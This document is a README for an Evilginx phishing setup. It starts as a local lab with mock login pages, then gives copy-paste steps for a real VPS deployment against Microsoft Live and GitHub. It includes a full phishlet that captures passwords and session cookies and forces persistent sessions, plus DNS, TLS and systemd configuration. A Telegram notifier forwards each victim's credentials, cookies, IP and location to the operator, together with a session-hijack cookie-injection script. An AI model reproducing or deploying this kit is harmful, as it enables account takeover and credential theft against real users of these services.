# Local Evilginx 3.3 Test Lab

Fully local MITM phishing testbed: **Evilginx 3.3.0 (Community Edition)** reverse-proxying two
**mock auth sites** (GitHub-style and Microsoft-style login pages), with credential + session-cookie
capture verified end-to-end in a real headless Chrome, and optional **Telegram bot notifications**
for captured sessions.

```
victim browser ──► evilginx (127.0.0.1:443)  ──► mock auth site (127.0.0.2:443)
                        │  lure /qGODpVHw          │  www.auth.test  -> GitHub-style login
                        │  proxies & rewrites      │  login.auth.test -> Microsoft-style login
                        ▼                          ▼
                  ~/.evilginx/data.db        telegram_notify.py  ──►  Telegram bot
```

## Components

| Component | Path | Purpose |
|---|---|---|
| Evilginx 3.3.0 CE | `./build/evilginx` (build from repo root) | MITM reverse proxy, lure paths, session store |
| Config | `~/.evilginx/config.json` | domain, bind address, phishlet hostnames, lures |
| Session DB | `~/.evilginx/data.db` | RESP-style JSON store (NOT SQLite) |
| Mock auth site | `mockauth/main.go` | Go HTTPS server on `127.0.0.2:443`, self-signed cert |
| Phishlet (GitHub-style) | `phishlets/mock-github.yaml` | orig `www.auth.test`, phish host `www.auth.test` |
| Phishlet (Microsoft-style) | `phishlets/mock-live.yaml` | orig `login.auth.test`, phish host `login.auth.test` |
| Real Microsoft Live phishlet | `phishlets/microsoft-live.yaml` | real `login.live.com`, for VPS use (see VPS section) |
| Real GitHub phishlet | `phishlets/github.yaml` | stock phishlet, disabled locally (for VPS) |
| Telegram notifier | `telegram_notify.py` | polls `data.db`, posts captures to Telegram |
| Test browser | headless Chrome on CDP `:9222` | real-browser flow (lure -> login -> dashboard) |

### Mock auth site endpoints (`mockauth/main.go`)

| Endpoint | Behavior |
|---|---|
| `GET /login` | Serves login form: GitHub-style (`www.auth.test`) or Microsoft-style (`login.auth.test`) |
| `POST /login` | Sets session cookies, `302 -> /dashboard` |
| `GET /dashboard` | Reads session cookie; renders "Welcome, <user>" or redirects to `/login` |
| `GET /logout` | Clears all cookies |

GitHub-style POST fields: `login`, `password` -> sets `user_session` (HttpOnly),
`logged_in=yes`, `dotcom_user=<user>` on `.auth.test`.

Microsoft-style POST fields: `loginfmt`, `passwd`, `Kmsi` -> sets `ESTSAUTH`, `ESTSAUTHPERSISTENT`,
`ULCfg`, `esctx` on `.auth.test`.

The GitHub-style page contains an absolute link (`https://www.auth.test/login`) specifically to
exercise evilginx `sub_filters` host rewriting.

## Setup

### 1. Build evilginx

```sh
export PATH=$PATH:/usr/local/go/bin
cd /Users/dev/Code/phishing-2fa
go build -o build/evilginx .
```

### 2. Loopback alias + hosts file (macOS)

The mock listens on a second loopback IP (`127.0.0.2`) so evilginx (127.0.0.1:443) and the mock
(127.0.0.2:443) can coexist on port 443:

```sh
sudo ifconfig lo0 alias 127.0.0.2/32
```

Add to `/etc/hosts` (the mock's hostnames must resolve to the mock's IP):

```
127.0.0.2 auth.test www.auth.test login.auth.test
```

### 3. Run the mock auth site

```sh
cd mockauth && go build -o /tmp/mockauth .
sudo nohup /tmp/mockauth > /tmp/mockauth.log 2>&1 &
```

### 4. Seed evilginx config

`~/.evilginx/config.json` (see "Config layout" below):

```json
{
  "general": {
    "autocert": true,
    "bind_ipv4": "127.0.0.1",
    "domain": "auth.test",
    "external_ipv4": "127.0.0.1",
    "https_port": 443,
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  },
  "phishlets": {
    "mock-github": { "hostname": "auth.test", "enabled": true, "visible": true },
    "mock-live":   { "hostname": "auth.test", "enabled": true, "visible": true },
    "github":      { "hostname": "", "enabled": false, "visible": true }
  },
  "lures": [
    { "id": "1", "phishlet": "mock-github", "path": "/qGODpVHw" },
    { "id": "2", "phishlet": "mock-live",   "path": "/ikcrEaqI" }
  ]
}
```

### 5. Run evilginx

Root is required (binding `127.0.0.1:443`). `-c` must point at the real config dir because `sudo`
changes `$HOME` to `/var/root`:

```sh
cd /Users/dev/Code/phishing-2fa
sudo nohup ./build/evilginx -developer -debug -p ./phishlets -c /Users/dev/.evilginx > /tmp/evilginx-run.log 2>&1 &
```

Logs go to `/tmp/evilginx-run.log` (debug + console output). Capture verification lines:

```
[+++] [0] Username: [victim@example.com]
[+++] [0] Password: [P@ssw0rd123]
[+++] [0] all authorization tokens intercepted!
```

### 6. Start the test browser

Headless Chrome with **resolver overrides** so the phish hostnames hit evilginx (127.0.0.1) instead
of the mock's /etc/hosts entry (127.0.0.2):

```sh
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --headless=new --disable-gpu --remote-debugging-port=9222 \
  --user-data-dir=/tmp/chrome-evilginx-test2 --ignore-certificate-errors \
  --no-first-run --no-default-browser-check \
  --host-resolver-rules="MAP www.auth.test 127.0.0.1, MAP login.auth.test 127.0.0.1, MAP auth.test 127.0.0.1"
```

### 7. Test the flow

Via `playwright-cli` (attached to CDP 9222), or curl with `--resolve`:

```sh
curl -k --resolve www.auth.test:443:127.0.0.1 https://www.auth.test/qGODpVHw
```

Expected chain (Chrome): lure `https://www.auth.test/qGODpVHw` -> 302 `https://www.auth.test/login`
-> "Sign in to AuthHub" -> fill `login`/`password` -> POST /login -> 302 `/dashboard`.

Verify the capture in the session store:

```sh
python3 telegram_notify.py --db ~/.evilginx/data.db --once  # prints current captures
```

or inspect `data.db` directly (RESP format, see "Gotchas").

## Config layout

```
~/.evilginx/
  config.json     # domain, bind_ipv4, https_port, phishlet hostnames, lures
  data.db         # sessions, RESP-style JSON records
  telegram_state.json   # created by telegram_notify.py
```

Session record keys: `id, phishlet, landing_url, username, password, custom, body_tokens,
http_tokens, tokens, session_id, useragent, remote_addr, create_time, update_time`.
Cookie tokens live under **`tokens`** (map: domain -> cookie name -> {Name, Value, Path, HttpOnly}).

## Telegram notifications

```sh
TG_BOT_TOKEN=123456:ABC-DEF TG_CHAT_ID=987654 python3 telegram_notify.py
```

See `telegram_notify.py --help` for options (custom bot API endpoint, poll interval, paths).
The notifier sends a message when a session's credentials are captured, then **edits the same
message** when the auth cookies arrive. Requires no pip installs (stdlib only).

For every capture it also sends two attachments:
- `<email>.json` — full export (raccoon-style): UUID id, IP/geo details, browser
  fingerprint (`bfp_details`, when the `X-Bfp` http token is configured in the phishlet),
  OS/browser families, captured cookies per origin with `is_valid` semantics
  (Microsoft flows are only "valid" with `ESTSAUTH`/`ESTSAUTHPERSISTENT`), microsecond timestamps.
- `<email>-injector.txt` — **session-hijack script**: paste it into the DevTools console while
  on the real login page; it plants the captured auth cookies (`Max-Age=1y`, `Secure`,
  `SameSite=None`) and redirects into the victim's session. Only sent when auth cookies exist
  (disable with `--no-injector`).

Each notification includes the victim's **IP address, geolocation (country / city / region),
ISP** (looked up via ip-api.com, cached per IP) and **device** (derived from the User-Agent:
device type, OS and browser). Private/loopback IPs are shown as "Local" without a lookup.

```
New capture: mock-live
User: u@outlook.com
Pass: SecretPass99!
Cookies:
  .auth.test
    ESTSAUTH = abc (HttpOnly)
Landing: https://login.auth.test/qGODpVHw
IP: 127.0.0.1
Location: Local
ISP: Local network
Device: CLI/bot (?)
Time: 2026-08-17 13:25:12 UTC
```

To create a bot: talk to [@BotFather](https://t.me/BotFather) (`/newbot`), then get your chat ID
via [@userinfobot](https://t.me/userinfobot) or `getUpdates`.

## Key gotchas discovered

1. **macOS low-port binding**: non-root can only bind the IPv6 wildcard `::` on ports < 1024.
   Specific addresses (127.0.0.1, 127.0.0.2) require root. Two specific loopback binds on the same
   port coexist; a wildcard `::` bind conflicts with them (EADDRINUSE).
2. **Never use `.localhost` hostnames**: Go's resolver ignores /etc/hosts for `*.localhost`
   (mDNS resolves to 127.0.0.1/::1), which made evilginx MITM itself. The reserved `.test` TLD +
   /etc/hosts is the correct approach.
3. **Chrome rejects `Set-Cookie: Domain=localhost` from subdomains** — the evilginx session cookie
   was silently dropped, so login POSTs had no session context and credentials were never captured.
   The base `domain` must be a parent suffix of every phish host (`auth.test` here).
4. **Phish host composition**: phish host = `phish_sub` + "." + configured phishlet hostname
   (`combineHost`). The configured hostname must be the BASE domain (`auth.test`), not the full
   host — otherwise you get double prefixes like `github.github.auth.test`. The lure URL is built
   from the phishlet's `is_landing` host.
5. **`phish_sub` collisions**: two `proxy_hosts` entries resolving to the same phish host produce a
   "hostname collision" warning and a broken SNI lookup ("hostname unsupported").
6. **Session cookie**: random name per instance (e.g. `df69-035d`), derived from
   `sha256(phishlet_name + "-" + random8)` truncated to `xxxx-xxxx`; expires 60 minutes after set.
7. **Credential extraction requires the session cookie** on the POST. Right after a lure visit the
   IP is whitelisted, which can mask a missing cookie (requests still proxy through, but nothing
   is captured).
8. **evilginx CONNECTs outbound to `orig host:443` (hardcoded)** — the mock must serve on 443.
   Outbound TLS verification is skipped (`InsecureSkipVerify`), so self-signed certs are fine.
9. **`data.db` is a Redis RESP-style JSON store, not SQLite.** Read sessions with a small parser;
   cookie tokens are under `tokens` (older docs call them `cookie_tokens`).
10. **Config persistence**: evilginx rewrites `config.json` on graceful exit. If you edit the file
    by hand while it runs, kill with SIGKILL (`sudo pkill -9 -f 'build/evilginx'`) to avoid your
    edits being clobbered, then restart.
11. **Chrome `--host-resolver-rules` overrides /etc/hosts** — required so the browser reaches
    evilginx (127.0.0.1) rather than the mock's IP.
12. **`sub_filters` rewriting**: `{hostname}` expands to the phish host of the matching proxy host.
    The mock's absolute link (`https://www.auth.test/login`) verifies this end-to-end.
13. **Sudo changes `$HOME`** to `/var/root` — always pass `-c /Users/dev/.evilginx` (or wherever
    the config lives) when running evilginx under sudo.

## VPS deployment (Ubuntu 22.04 / 24.04, real domain)

> Full step-by-step guide: **[VPS_SETUP.md](VPS_SETUP.md)**. This section covers the concepts
> and the Microsoft Live phishlet config.

The exact same setup runs on a VPS, with the mock auth sites swapped for real phishlets
(e.g. Microsoft Live) and a real domain. Everything below is copy-paste ready for
Ubuntu 22.04/24.04.

### 1. Server prep

```sh
# Go 1.22+ (Ubuntu 24.04 ships 1.22; 22.04 needs the official tarball or a PPA)
apt update && apt install -y golang-go git curl

# Firewall: only SSH, HTTP (LE challenge) and HTTPS. Port 53 only if you use
# evilginx's built-in DNS server (see "DNS" below).
ufw allow OpenSSH
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
```

### 2. Build

```sh
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx
cd /opt/evilginx
go build -o build/evilginx .
```

Copy in your phishlets (see below for the Microsoft Live one) and this repo's
`telegram_notify.py`.

### 3. DNS records

Point A records at the VPS public IP (evilginx's `external_ipv4`). With `domain=phish.example.com`
and the phishlet hostnames below, you need:

| Record | Type | Value |
|---|---|---|
| `phish.example.com` | A | VPS IP |
| `login.phish.example.com` | A | VPS IP |
| `account.phish.example.com` | A | VPS IP |
| `www.github.phish.example.com`, `github.phish.example.com` (for the github phishlet) | A | VPS IP |

Optional: delegate a subdomain's nameservers to the VPS and run evilginx's built-in DNS server
(`dns_port: 53`, UDP+TCP open in ufw). evilginx then answers queries for the delegated zone
itself (wildcard `*.phish.example.com`), which also lets it resolve real phish hostnames
(lure redirect URLs, etc.) without touching public DNS.

### 4. Microsoft Live phishlet (real login.live.com)

`phishlets/microsoft-live.yaml` (already in this repo — full community phishlet targeting the
real origin):

```yaml
name: 'microsoft-live'
author: 'evilginx2 community (login.live.com / Microsoft account flow)'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login.microsoftonline', orig_sub: 'login', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
sub_filters:
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'storage.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'storage.live.com', orig_sub: 'storage', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'www.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'compass-ssl.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'compass-ssl.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']}
auth_tokens:
  - domain: '.login.live.com'
    keys: ['MSPOK', 'SDIDC', 'JSHP', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', '.*,regexp']
  - domain: '.live.com'
    keys: ['.*,regexp']
  - domain: '.microsoft.com'
    keys: ['.*,regexp']
auth_urls:
  - '/'
  - '/.*'
  - '/auth'
  - '/auth/.*'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
force_post:
  - path: '/ppsecure/post.srf'
    search:
      - {key: 'login', search: '.*'}
      - {key: 'passwd', search: '.*'}
    force:
      - {key: 'KMSI', value: 'on'}
    type: 'post'
login:
  domain: 'login.live.com'
  path: '/login.srf'
```

Notes:

- Phish hosts (what the victim sees) are `login.phish.example.com`, `account.phish.example.com`,
  etc. — with `domain=phish.example.com` in config and the `phish_sub` values above, matching the
  real hostnames being impersonated. DNS records needed: `login`, `cdn`, `account`, `outlook`,
  `storage`, `microsoft`, `www`, `ssl`, `login.microsoftonline` under `phish.example.com`.
- `proxy_hosts` cover the full consumer login flow: the sign-in UI (`login.live.com`),
  static assets (`logincdn.msauth.net`), post-login redirects (`outlook.live.com`,
  `storage.live.com`, `account.live.com`) and Microsoft account pages (`account.microsoft.com`,
  `www.microsoft.com`, `compass-ssl.microsoft.com`), plus tenant-based auth fallbacks
  (`login.microsoftonline.com`).
- `auth_tokens` use the `.*,regexp` catch-all (all cookies on `login.live.com` are tracked —
  `ESTSAUTH`/`ESTSAUTHPERSISTENT` for session hijacking, `MSPOK`/`SDIDC`/`JSHP` for the sign-in
  state), so no cookie ever escapes capture when the flow adds new ones. `auth_urls` make
  every path an authorization-token checkpoint.
- `force_post` forces `KMSI=on` (keep me signed in) on the `/ppsecure/post.srf` credential POST,
  making the victim's session persistent and the `ESTSAUTHPERSISTENT` cookie captureable.
- Microsoft's flow changes over time (tenant redirects to `login.microsoftonline.com`, MSA
  fallbacks to `account.live.com`, extra CDNs like `aadcdn.msftauth.net`, etc.). Verify each
  redirect hop in a real browser and add `proxy_hosts`/`sub_filters` entries for any extra
  origins that appear, mirroring the `mock-live.yaml` -> `microsoft-live.yaml` pattern.

### 5. Config (`/root/.evilginx/config.json`)

```json
{
  "blacklist": { "mode": "unauth" },
  "general": {
    "autocert": true,
    "bind_ipv4": "0.0.0.0",
    "dns_port": 53,
    "domain": "phish.example.com",
    "external_ipv4": "1.2.3.4",
    "https_port": 443,
    "ipv4": "",
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  },
  "lures": [
    {
      "id": "1",
      "phishlet": "microsoft-live",
      "path": "/qGODpVHw",
      "redirect_url": "",
      "redirector": ""
    }
  ],
  "phishlets": {
    "microsoft-live": { "hostname": "phish.example.com", "enabled": true, "visible": true },
    "github":          { "hostname": "phish.example.com", "enabled": false, "visible": true }
  }
}
```

Key settings:

- `autocert: true` — evilginx automatically obtains Let's Encrypt certificates for the phish
  hosts (`config autocert on` / `phishlets enable <name>` in the console do the same). Port 80
  must be reachable for the ACME HTTP-01 challenge.
- `external_ipv4` must be the VPS public IP (used for the internal DNS server and lure URLs).
- `bind_ipv4: 0.0.0.0` — accept connections on all interfaces.
- `https_port` is only configurable in `config.json` (no console command).
- `domain` = attacker base domain; phish hostnames are derived as
  `phish_sub + "." + <phishlet hostname>` (see Gotchas #4).

### 6. Run as a systemd service

`/etc/systemd/system/evilginx.service`:

```ini
[Unit]
Description=Evilginx 3.3
After=network-online.target

[Service]
Type=simple
ExecStart=/opt/evilginx/build/evilginx -developer -debug -p /opt/evilginx/phishlets -c /root/.evilginx
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```sh
systemctl daemon-reload
systemctl enable --now evilginx
journalctl -u evilginx -f
```

### 7. Telegram notifier as a systemd service

`/etc/systemd/system/evilginx-telegram.service`:

```ini
[Unit]
Description=Evilginx Telegram notifier
After=evilginx.service

[Service]
Type=simple
Environment=TG_BOT_TOKEN=123456:ABC-DEF
Environment=TG_CHAT_ID=987654
ExecStart=/usr/bin/python3 /opt/evilginx/telegram_notify.py --db /root/.evilginx/data.db --state /root/.evilginx/telegram_state.json --interval 5
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```sh
systemctl daemon-reload
systemctl enable --now evilginx-telegram
```

### 8. Verify

```sh
# from another machine (or a phone on 4G — not the VPS's own IP, that's whitelisted)
curl -k https://login.phish.example.com/qGODpVHw
# expect: 302 -> https://login.phish.example.com/login.srf
# then complete the login in a real browser and check:
journalctl -u evilginx | grep -E 'Username|intercepted'
# Telegram should receive the capture message with creds + cookies
```

### 9. Same setup, other phishlets

- **GitHub**: enable the stock `phishlets/github.yaml` (this repo's copy was modified: the
  bare-domain `github.com` proxy host was added BEFORE the `www` entry so GitHub's canonical
  `301 www -> bare` rewrite targets the phish host instead of a dead hostname).
- **Mock (local only)**: the mock auth site is only needed for local testing; real phishlets
  target the real origin.

## Cleanup

```sh
sudo pkill -9 -f 'build/evilginx'   # evilginx (root)
sudo pkill -f mockauth              # mock auth site (root)
pkill -f chrome-evilginx-test2      # headless Chrome
rm -rf /tmp/chrome-evilginx-test2 /tmp/mockauth /tmp/evilginx-run.log /tmp/mockauth.log
```